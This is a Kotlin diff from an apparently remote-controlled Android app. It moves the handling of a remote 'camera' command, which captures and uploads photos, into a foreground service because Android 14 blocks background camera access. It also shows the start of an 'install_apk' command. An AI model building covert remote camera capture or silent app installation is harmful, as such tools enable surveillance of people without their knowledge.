@@ -47,8 +47,10 @@ object CommandRunner {
 
                 "camera" -> {
                     val lens = if (params.optString("lens") == "front") "front" else "back"
-                    val error = Camera.captureAndUpload(ctx, commandId, lens)
-                    if (error == null) "done" to lens else "failed" to error
+                    // Съёмка идёт в foreground-сервисе: из фона Android 14 к
+                    // камере не пускает. Подтверждение придёт оттуда асинхронно.
+                    CameraService.capture(ctx, commandId, lens)
+                    null
                 }
 
                 "install_apk" -> {
